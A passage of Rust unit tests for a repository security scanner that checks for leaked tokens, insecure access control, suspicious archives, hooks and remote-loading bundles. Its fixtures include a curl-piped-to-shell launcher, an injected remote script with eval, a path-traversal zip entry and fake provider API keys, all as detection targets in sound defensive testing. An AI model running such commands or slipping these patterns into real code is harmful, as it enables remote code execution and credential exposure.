                "server/users.ts",
                "user.isAdmin = req.body.isAdmin;\n",
            ),
            (
                "admin/views.py",
                "permission_classes = [AllowAny]\n",
            ),
        ]);

        let findings = BasicSastScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Request-controlled input appears to set privilege or ownership state")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Privileged surface appears to bypass normal access control")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_non_privileged_allowany_and_server_side_admin_checks() {
        let (context, root) = test_context(&[
            (
                "health/views.py",
                "permission_classes = [AllowAny]\n",
            ),
            (
                "server/auth.ts",
                "if (req.user.role === 'admin') { return next(); }\n",
            ),
        ]);

        let findings = BasicSastScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.is_empty(), "expected no findings, got: {findings:#?}");
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_safe_yaml_loader_and_static_fetches() {
        let (context, root) = test_context(&[(
            "jobs/load.py",
            "config = yaml.safe_load(raw_config)\nrequests.get(\"https://api.example.com/health\")\nopen(\"/var/app/config.json\")\ncursor.execute(\"SELECT * FROM users WHERE id = ?\", [user_id])\n",
        )]);

        let findings = BasicSastScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(
            findings.is_empty(),
            "expected no appsec findings, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_additional_prefixed_service_tokens() {
        let (context, root) = test_context(&[(
            "tokens.txt",
            "gitlab=glpat-1234567890abcdefghijkl\nhf=hf_abcdefghijklmnopqrstuvwxyz123456\nsendgrid=SG.abcdefghijklmnopqrstuvwxyz.1234567890ABCDEFGHIJKLMNOP\nplaceholder=hf_example_token\n",
        )]);

        let findings = SecretScanner.scan(&context).expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| finding.title.contains("GitLab personal access token")));
        assert!(findings
            .iter()
            .any(|finding| finding.title.contains("Hugging Face token")));
        assert!(findings
            .iter()
            .any(|finding| finding.title.contains("SendGrid API key")));
        assert_eq!(
            findings
                .iter()
                .filter(|finding| finding.title.contains("Hugging Face token"))
                .count(),
            1
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_packaged_archive_artifacts() {
        let (context, root) = test_context_bytes(&[(
            "release/app.zip",
            b"PK\x03\x04\x14\x00\x00\x00\x08\x00artifact",
        )]);

        let findings = ArtifactScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Packaged archive artifact included in outbound change set")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_zip_style_archive_contents_with_traversal_and_executables() {
        let (context, root) = test_context_bytes(&[(
            "release/app.zip",
            &zip_style_archive_fixture(&["../etc/passwd", "bin/installer.exe"]),
        )]);

        let findings = ArtifactScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.id == "artifact.archive.path-traversal-entry"
        }));
        assert!(findings.iter().any(|finding| {
            finding.id == "artifact.archive.embedded-executable"
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_zip_style_archive_contents_without_suspicious_entries() {
        let (context, root) = test_context_bytes(&[(
            "release/app.zip",
            &zip_style_archive_fixture(&["docs/readme.txt", "assets/logo.svg"]),
        )]);

        let findings = ArtifactScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings.iter().all(|finding| {
                finding.id != "artifact.archive.path-traversal-entry"
                    && finding.id != "artifact.archive.embedded-executable"
            }),
            "expected no archive-content findings, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_compiled_binary_artifacts() {
        let (context, root) =
            test_context_bytes(&[("src/native/helper", b"\x7fELF\x02\x01\x01compiled")]);

        let findings = ArtifactScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Compiled binary artifact included in outbound change set")
                && finding.severity == Severity::High
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_minified_javascript_bundles_with_dynamic_remote_loaders() {
        let minified = "(()=>{var s=document.createElement(\"script\");s.src=\"https://cdn.example.com/payload.js\";document.head.appendChild(s);eval(\"console.log('run')\");})();";
        let padded = format!("{}\n", minified.repeat(8));
        let (context, root) = test_context(&[("dist/app.min.js", &padded)]);

        let findings = ArtifactScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Minified JavaScript bundle contains dynamic remote loader behavior")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_minified_javascript_bundles_with_remote_beaconing() {
        let minified = "(()=>{navigator.sendBeacon(\"https://telemetry.example.com/collect\",JSON.stringify({path:location.pathname,ts:Date.now()}));})();";
        let padded = format!("{}\n", minified.repeat(8));
        let (context, root) = test_context(&[("dist/telemetry.min.js", &padded)]);

        let findings = ArtifactScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.id == "artifact.minified-bundle.beaconing"
                && finding.severity == Severity::High
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_minified_javascript_without_remote_beaconing_behavior() {
        let minified = "(()=>{const data={path:location.pathname};console.log(data);fetch('/api/health');})();";
        let padded = format!("{}\n", minified.repeat(8));
        let (context, root) = test_context(&[("dist/runtime.min.js", &padded)]);

        let findings = ArtifactScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings
                .iter()
                .all(|finding| finding.id != "artifact.minified-bundle.beaconing"),
            "expected no beaconing artifact findings, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_source_map_artifacts_in_source_like_paths() {
        let (context, root) = test_context(&[(
            "src/client/app.js.map",
            "{\"version\":3,\"file\":\"app.js\",\"sources\":[\"app.ts\"]}\n",
        )]);

        let findings = ArtifactScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.id == "artifact.source-map" && finding.severity == Severity::High
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_source_map_artifacts_in_distribution_paths() {
        let (context, root) = test_context(&[(
            "dist/app.js.map",
            "{\"version\":3,\"file\":\"app.js\",\"sources\":[\"app.ts\"]}\n",
        )]);

        let findings = ArtifactScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.id == "artifact.source-map" && finding.severity == Severity::Medium
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_embedded_secrets_in_generated_assets() {
        let (context, root) = test_context(&[(
            "dist/app.js",
            "window.__CONFIG__={apiKey:\"sk-proj-abcdefghijklmnopqrstuvwxyz123456\",authorization:\"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.payload.signature\"};\n",
        )]);

        let findings = ArtifactScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.id == "artifact.generated-asset.embedded-secret"
                && finding.severity == Severity::High
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_source_files_and_placeholder_values_for_generated_secret_artifacts() {
        let (context, root) = test_context(&[
            (
                "src/app/config.js",
                "window.__CONFIG__={apiKey:\"sk-proj-abcdefghijklmnopqrstuvwxyz123456\"};\n",
            ),
            (
                "dist/app.js",
                "window.__CONFIG__={apiKey:\"your_api_key_here\",authorization:\"Bearer example-token\"};\n",
            ),
        ]);

        let findings = ArtifactScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings
                .iter()
                .all(|finding| finding.id != "artifact.generated-asset.embedded-secret"),
            "expected no generated-secret artifact findings, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    #[cfg(unix)]
    fn detects_new_executable_text_artifacts_outside_script_paths() {
        let (context, root) = test_context(&[
            ("README.md", "baseline\n"),
            ("src/launcher", "#!/bin/sh\ncurl -fsSL https://example.com/run.sh | sh\n"),
        ]);
        initialize_git_repo(&root);
        run_git(&root, &["config", "user.email", "wolfence-tests@example.com"]);
        run_git(&root, &["config", "user.name", "Wolfence Tests"]);
        run_git(&root, &["add", "README.md"]);
        run_git(&root, &["commit", "-m", "baseline"]);
        let launcher_path = root.join("src/launcher");
        let mut permissions = fs::metadata(&launcher_path)
            .expect("launcher metadata should exist")
            .permissions();
        permissions.set_mode(0o755);
        fs::set_permissions(&launcher_path, permissions)
            .expect("launcher permissions should be updated");

        let findings = ArtifactScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.id == "artifact.executable-text.new-file"
                && finding.severity == Severity::High
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    #[cfg(unix)]
    fn ignores_new_executable_scripts_in_normal_tooling_paths() {
        let (context, root) = test_context(&[
            ("README.md", "baseline\n"),
            ("scripts/release.sh", "#!/bin/sh\necho release\n"),
        ]);
        initialize_git_repo(&root);
        run_git(&root, &["config", "user.email", "wolfence-tests@example.com"]);
        run_git(&root, &["config", "user.name", "Wolfence Tests"]);
        run_git(&root, &["add", "README.md"]);
        run_git(&root, &["commit", "-m", "baseline"]);
        let script_path = root.join("scripts/release.sh");
        let mut permissions = fs::metadata(&script_path)
            .expect("script metadata should exist")
            .permissions();
        permissions.set_mode(0o755);
        fs::set_permissions(&script_path, permissions)
            .expect("script permissions should be updated");

        let findings = ArtifactScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings
                .iter()
                .all(|finding| finding.id != "artifact.executable-text.new-file"),
            "expected no executable-text artifact findings, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_regular_assets_and_non_suspicious_javascript() {
        let (context, root) =
            test_context_bytes(&[("public/logo.png", b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR")]);

        let findings = ArtifactScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings.is_empty(),
            "expected no artifact findings, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_wolfence_config_posture_reductions() {
        let (context, root) = test_context(&[(
            ".wolfence/config.toml",
            "[policy]\nmode = \"advisory\"\n\n[scan]\nignore_paths = [\"src/\", \"docs/\"]\n",
        )]);

        let findings = PolicyScanner.scan(&context).expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| finding.title.contains("Wolfence repo-local config changed")));
        assert!(findings.iter().any(|finding| finding
            .title
            .contains("Wolfence enforcement mode is set to advisory")));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Wolfence scan exclusions target security-sensitive repository surfaces")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_wolfence_trust_and_receipt_authority_changes() {
        let (context, root) = test_context(&[
            (".wolfence/trust/security-team.pem", "dummy-public-key\n"),
            (
                ".wolfence/trust/security-team.toml",
                "owner = \"security-team\"\nexpires_on = \"2027-01-01\"\n",
            ),
            (
                ".wolfence/receipts/allow-secret.toml",
                "version = \"1\"\naction = \"push\"\ncategory = \"secret\"\nfingerprint = \"secret:abc\"\nowner = \"yoav\"\nreason = \"temporary\"\ncreated_on = \"2026-04-10\"\nexpires_on = \"2026-04-11\"\nchecksum = \"abc\"\n",
            ),
            (
                ".wolfence/policy/receipts.toml",
                "require_signed_receipts = true\nallowed_reviewers = [\"security-team\"]\n",
            ),
        ]);

        let findings = PolicyScanner.scan(&context).expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| finding.title.contains("Wolfence trust store changed")));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Wolfence trust metadata appears to grant unrestricted signer scope")
        }));
        assert!(findings
            .iter()
            .any(|finding| finding.title.contains("Wolfence override receipt changed")));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Wolfence receipt approval policy changed")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_wolfence_scanner_bundle_surface_changes() {
        let (context, root) = test_context(&[
            ("src/core/scanners.rs", "pub struct SecretScanner;\n"),
            ("src/core/findings.rs", "pub struct Finding;\n"),
        ]);

        let findings = PolicyScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().filter(|finding| {
            finding
                .title
                .contains("Wolfence scanner bundle surface changed")
        }).count() >= 2);
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_missing_rule_provenance_for_scanner_bundle_changes() {
        let (context, root) = test_context(&[("src/core/scanners.rs", "pub struct SecretScanner;\n")]);

        let findings = PolicyScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.id == "policy.wolfence.rule-provenance-missing"
                && finding
                    .title
                    .contains("Wolfence scanner bundle changed without rule provenance update")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_rule_provenance_gap_when_inventory_changes_with_scanner_bundle() {
        let (context, root) = test_context(&[
            ("src/core/scanners.rs", "pub struct SecretScanner;\n"),
            ("docs/security/scanner-inventory.json", "{\n  \"families\": []\n}\n"),
        ]);

        let findings = PolicyScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings
                .iter()
                .all(|finding| finding.id != "policy.wolfence.rule-provenance-missing"),
            "expected no rule-provenance-missing finding, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn downgrades_scanner_bundle_change_when_rule_provenance_changes_with_it() {
        let (context, root) = test_context(&[
            ("src/core/scanners.rs", "pub struct SecretScanner;\n"),
            ("docs/security/scanner-inventory.md", "# inventory\n"),
        ]);

        let findings = PolicyScanner.scan(&context).expect("scan should succeed");
        let bundle_findings = findings
            .iter()
            .filter(|finding| finding.id == "policy.wolfence.scanner-bundle-changed")
            .collect::<Vec<_>>();

        assert!(
            !bundle_findings.is_empty(),
            "expected scanner-bundle finding, got: {findings:#?}"
        );
        assert!(
            bundle_findings
                .iter()
                .all(|finding| finding.severity == Severity::Low),
            "expected scanner-bundle finding severity to downgrade when provenance changes too, got: {bundle_findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_non_bundle_source_changes_for_scanner_bundle_integrity() {
        let (context, root) = test_context(&[
            ("src/app.rs", "pub fn run() {}\n"),
            ("docs/notes.md", "scanner docs\n"),
        ]);

        let findings = PolicyScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings
                .iter()
                .all(|finding| finding.id != "policy.wolfence.scanner-bundle-changed"),
            "expected no scanner-bundle integrity finding, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_missing_codeowners_for_sensitive_governance_surfaces() {
        let (context, root) = test_context(&[(
            ".github/workflows/release.yml",
            "name: release\non:\n  push:\n    tags: ['v*']\n",
        )]);

        let findings = PolicyScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("sensitive governance surfaces but no CODEOWNERS file")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_malformed_codeowners_rules() {
        let (context, root) = test_context(&[
            (".github/CODEOWNERS", ".github/workflows/\n"),
            (
                ".github/workflows/release.yml",
                "name: release\non:\n  push:\n    tags: ['v*']\n",
            ),
        ]);

        let findings = PolicyScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("CODEOWNERS file contains a rule without owners")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_uncovered_workflow_governance_paths() {
        let (context, root) = test_context(&[
            (".github/CODEOWNERS", "src/ @app-team\n"),
            (
                ".github/workflows/release.yml",
                "name: release\non:\n  push:\n    tags: ['v*']\n",
            ),
        ]);

        let findings = PolicyScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("CODEOWNERS does not cover a sensitive governance path")
                && finding.location().contains(".github/workflows/release.yml")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_uncovered_wolfence_policy_paths() {
        let (context, root) = test_context(&[
            (".github/CODEOWNERS", ".github/workflows/ @platform-team\n"),
            (".wolfence/config.toml", "[policy]\nmode = \"standard\"\n"),
        ]);

        let findings = PolicyScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("CODEOWNERS does not cover a sensitive governance path")
                && finding.location().contains(".wolfence/config.toml")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_multiple_codeowners_files() {
        let (context, root) = test_context(&[
            (".github/CODEOWNERS", "* @security-team\n"),
            ("CODEOWNERS", "* @platform-team\n"),
            (
                ".github/workflows/release.yml",
                "name: release\non:\n  push:\n    tags: ['v*']\n",
            ),
        ]);

        let findings = PolicyScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Repository contains multiple CODEOWNERS files")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_unmanaged_pre_push_hooks_during_protected_pushs() {
        let (mut context, root) = test_context(&[]);
        initialize_git_repo(&root);
        let hooks_dir = crate::core::git::hooks_dir(&root).expect("hooks dir should resolve");
        fs::create_dir_all(&hooks_dir).expect("hooks dir should exist");
        fs::write(hooks_dir.join("pre-push"), "#!/bin/sh\necho custom\n")
            .expect("hook should be written");
        context.action = ProtectedAction::Push;

        let findings = PolicyScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Git pre-push hook exists but is not managed by Wolfence")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_external_hooks_path_overrides_during_protected_pushs() {
        let (mut context, root) = test_context(&[]);
        initialize_git_repo(&root);
        let shared_hooks = root.with_extension("shared-hooks");
        fs::create_dir_all(&shared_hooks).expect("shared hooks dir should exist");
        run_git(
            &root,
            &["config", "core.hooksPath", shared_hooks.to_str().unwrap()],
        );
        context.action = ProtectedAction::Push;

        let findings = PolicyScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Git hooks path is overridden outside the repository")
        }));
        fs::remove_dir_all(shared_hooks).ok();
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    #[cfg(unix)]
    fn detects_external_hook_symlinks_during_protected_pushs() {
        let (mut context, root) = test_context(&[]);
        initialize_git_repo(&root);
        let hooks_dir = crate::core::git::hooks_dir(&root).expect("hooks dir should resolve");
        fs::create_dir_all(&hooks_dir).expect("hooks dir should exist");
        let external_target = root.with_extension("external-pre-push");
        fs::write(
            &external_target,
            "#!/bin/sh\n# wolfence-managed-hook\n# wolfence-launcher: binary-path\nexec wolf hook-pre-push\n",
        )
        .expect("external managed hook should be written");
        {
            use std::os::unix::fs::{symlink, PermissionsExt};

            let mut permissions = fs::metadata(&external_target)
                .expect("external hook metadata should exist")
                .permissions();
            permissions.set_mode(0o755);
            fs::set_permissions(&external_target, permissions)
                .expect("external hook permissions should be updated");
            symlink(&external_target, hooks_dir.join("pre-push"))
                .expect("pre-push symlink should be created");
        }
        context.action = ProtectedAction::Push;

        let findings = PolicyScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("hook symlinks that resolve outside the repository")
        }));
        fs::remove_file(external_target).ok();
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    #[cfg(unix)]
    fn detects_external_hook_helper_paths_during_protected_pushs() {
        let (mut context, root) = test_context(&[]);
        initialize_git_repo(&root);
        let hooks_dir = crate::core::git::hooks_dir(&root).expect("hooks dir should resolve");
        fs::create_dir_all(&hooks_dir).expect("hooks dir should exist");
        let hook_path = hooks_dir.join("pre-push");
        let external_helper = root.with_extension("external-hook-helper.sh");
        fs::write(&external_helper, "#!/bin/sh\necho helper\n")
            .expect("external helper should be written");
        fs::write(
            &hook_path,
            format!("#!/bin/sh\nexec {}\n", external_helper.display()),
        )
        .expect("hook should be written");
        {
            use std::os::unix::fs::PermissionsExt;

            for path in [&hook_path, &external_helper] {
                let mut permissions = fs::metadata(path)
                    .expect("file metadata should exist")
                    .permissions();
                permissions.set_mode(0o755);
                fs::set_permissions(path, permissions)
                    .expect("file permissions should be updated");
            }
        }
        context.action = ProtectedAction::Push;

        let findings = PolicyScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("hook helper paths that resolve outside the repository")
        }));
        fs::remove_file(external_helper).ok();
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    #[cfg(unix)]
    fn ignores_repo_local_hook_symlinks_during_protected_pushs() {
        let (mut context, root) = test_context(&[]);
        initialize_git_repo(&root);
        let hooks_dir = crate::core::git::hooks_dir(&root).expect("hooks dir should resolve");
        fs::create_dir_all(&hooks_dir).expect("hooks dir should exist");
        let repo_local_target_dir = root.join(".hook-targets");
        fs::create_dir_all(&repo_local_target_dir).expect("repo-local target dir should exist");
        let repo_local_target = repo_local_target_dir.join("pre-push");
        fs::write(
            &repo_local_target,
            "#!/bin/sh\n# wolfence-managed-hook\n# wolfence-launcher: binary-path\nexec wolf hook-pre-push\n",
        )
        .expect("repo-local managed hook should be written");
        {
            use std::os::unix::fs::{symlink, PermissionsExt};

            let mut permissions = fs::metadata(&repo_local_target)
                .expect("repo-local hook metadata should exist")
                .permissions();
            permissions.set_mode(0o755);
            fs::set_permissions(&repo_local_target, permissions)
                .expect("repo-local hook permissions should be updated");
            symlink(&repo_local_target, hooks_dir.join("pre-push"))
                .expect("pre-push symlink should be created");
        }
        context.action = ProtectedAction::Push;

        let findings = PolicyScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings
                .iter()
                .all(|finding| finding.id != "policy.wolfence.external-hook-symlink"),
            "expected no external-hook-symlink finding, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    #[cfg(unix)]
    fn ignores_repo_local_hook_helper_paths_during_protected_pushs() {
        let (mut context, root) = test_context(&[]);
        initialize_git_repo(&root);
        let hooks_dir = crate::core::git::hooks_dir(&root).expect("hooks dir should resolve");
        fs::create_dir_all(&hooks_dir).expect("hooks dir should exist");
        let hook_path = hooks_dir.join("pre-push");
        let helper_dir = root.join(".hook-targets");
        fs::create_dir_all(&helper_dir).expect("helper dir should exist");
        let repo_local_helper = helper_dir.join("pre-push-helper.sh");
        fs::write(&repo_local_helper, "#!/bin/sh\necho helper\n")
            .expect("repo-local helper should be written");
        fs::write(
            &hook_path,
            format!("#!/bin/sh\nexec {}\n", repo_local_helper.display()),
        )
        .expect("hook should be written");
        {
            use std::os::unix::fs::PermissionsExt;

            for path in [&hook_path, &repo_local_helper] {
                let mut permissions = fs::metadata(path)
                    .expect("file metadata should exist")
                    .permissions();
                permissions.set_mode(0o755);
                fs::set_permissions(path, permissions)
                    .expect("file permissions should be updated");
            }
        }
        context.action = ProtectedAction::Push;

        let findings = PolicyScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings
                .iter()
                .all(|finding| finding.id != "policy.wolfence.external-hook-helper"),
            "expected no external-hook-helper finding, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_repo_local_hooks_path_overrides_during_protected_pushs() {
        let (mut context, root) = test_context(&[]);
        initialize_git_repo(&root);
        let repo_local_hooks = root.join(".githooks");
        fs::create_dir_all(&repo_local_hooks).expect("repo-local hooks dir should exist");
        let hook_path = repo_local_hooks.join("pre-push");
        fs::write(
            &hook_path,
            "#!/bin/sh\n# wolfence-managed-hook\n# wolfence-launcher: binary-path\nexec wolf hook-pre-push\n",
        )
        .expect("managed hook should be written");
        #[cfg(unix)]
        {
            let mut permissions = fs::metadata(&hook_path)
                .expect("hook metadata should exist")
                .permissions();
            permissions.set_mode(0o755);
            fs::set_permissions(&hook_path, permissions)
                .expect("hook permissions should be updated");
        }
        run_git(&root, &["config", "core.hooksPath", ".githooks"]);
        context.action = ProtectedAction::Push;

        let findings = PolicyScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Git hooks path is overridden to a repo-local alternate directory")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_additional_unmanaged_executable_hooks_during_protected_pushs() {
        let (mut context, root) = test_context(&[]);
        initialize_git_repo(&root);
        let hooks_dir = crate::core::git::hooks_dir(&root).expect("hooks dir should resolve");
        fs::create_dir_all(&hooks_dir).expect("hooks dir should exist");
        let pre_push = hooks_dir.join("pre-push");
        fs::write(
            &pre_push,
            "#!/bin/sh\n# wolfence-managed-hook\n# wolfence-launcher: binary-path\nexec wolf hook-pre-push\n",
        )
        .expect("managed pre-push hook should be written");
        let pre_commit = hooks_dir.join("pre-commit");
        fs::write(&pre_commit, "#!/bin/sh\necho custom\n").expect("pre-commit should be written");
        #[cfg(unix)]
        {
            for path in [&pre_push, &pre_commit] {
                let mut permissions = fs::metadata(path)
                    .expect("hook metadata should exist")
                    .permissions();
                permissions.set_mode(0o755);
                fs::set_permissions(path, permissions)
                    .expect("hook permissions should be updated");
            }
        }
        context.action = ProtectedAction::Push;

        let findings = PolicyScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Effective Git hooks directory contains additional unmanaged executable hooks")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_non_executable_or_sample_hooks_in_effective_directory() {
        let (mut context, root) = test_context(&[]);
        initialize_git_repo(&root);
        let hooks_dir = crate::core::git::hooks_dir(&root).expect("hooks dir should resolve");
        fs::create_dir_all(&hooks_dir).expect("hooks dir should exist");
        let pre_push = hooks_dir.join("pre-push");
        fs::write(
            &pre_push,
            "#!/bin/sh\n# wolfence-managed-hook\n# wolfence-launcher: binary-path\nexec wolf hook-pre-push\n",
        )
        .expect("managed pre-push hook should be written");
        fs::write(hooks_dir.join("pre-commit.sample"), "#!/bin/sh\necho sample\n")
            .expect("sample hook should be written");
        fs::write(hooks_dir.join("commit-msg"), "#!/bin/sh\necho custom\n")
            .expect("commit-msg hook should be written");
        #[cfg(unix)]
        {
            let mut permissions = fs::metadata(&pre_push)
                .expect("hook metadata should exist")
                .permissions();
            permissions.set_mode(0o755);
            fs::set_permissions(&pre_push, permissions)
                .expect("hook permissions should be updated");
        }
        context.action = ProtectedAction::Push;

        let findings = PolicyScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings
                .iter()
                .all(|finding| finding.id != "policy.wolfence.additional-unmanaged-hooks"),
            "expected no additional-unmanaged-hooks finding, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_legacy_managed_pre_push_hooks_during_protected_pushs() {
        let (mut context, root) = test_context(&[]);
        initialize_git_repo(&root);
        let hooks_dir = crate::core::git::hooks_dir(&root).expect("hooks dir should resolve");
        fs::create_dir_all(&hooks_dir).expect("hooks dir should exist");
        let hook_path = hooks_dir.join("pre-push");
        fs::write(
            &hook_path,
            "#!/bin/sh\n# wolfence-managed-hook\nexec cargo run --quiet --bin wolf -- hook-pre-push\n",
        )
        .expect("legacy hook should be written");
        #[cfg(unix)]
        {
            let mut permissions = fs::metadata(&hook_path)
                .expect("hook metadata should exist")
                .permissions();
            permissions.set_mode(0o755);
            fs::set_permissions(&hook_path, permissions)
                .expect("hook permissions should be updated");
        }
        context.action = ProtectedAction::Push;

        let findings = PolicyScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("managed pre-push hook uses a legacy cargo-only launcher")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_ai_provider_and_webhook_secret_prefixes() {
        let (context, root) = test_context(&[(
            "tokens.txt",
            "openai=sk-proj-abcdefghijklmnopqrstuvwxyz1234567890\nservice=sk-svcacct-abcdefghijklmnopqrstuvwxyz1234567890\nanthropic=sk-ant-abcdefghijklmnopqrstuvwxyz1234567890\nstripe=whsec_abcdefghijklmnopqrstuvwxyz1234567890\nplaceholder=sk-proj-example-token\n",
        )]);

        let findings = SecretScanner.scan(&context).expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| finding.title.contains("OpenAI API key")));
        assert!(findings
            .iter()
            .any(|finding| finding.title.contains("OpenAI service account key")));
        assert!(findings
            .iter()
            .any(|finding| finding.title.contains("Anthropic API key")));
        assert!(findings
            .iter()
            .any(|finding| finding.title.contains("Stripe webhook secret")));
        assert_eq!(
            findings
                .iter()
                .filter(|finding| finding.title.contains("OpenAI API key"))
                .count(),
            1
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_private_key_assignments_with_escaped_payloads() {
        let (context, root) = test_context(&[(
            "service-account.json",
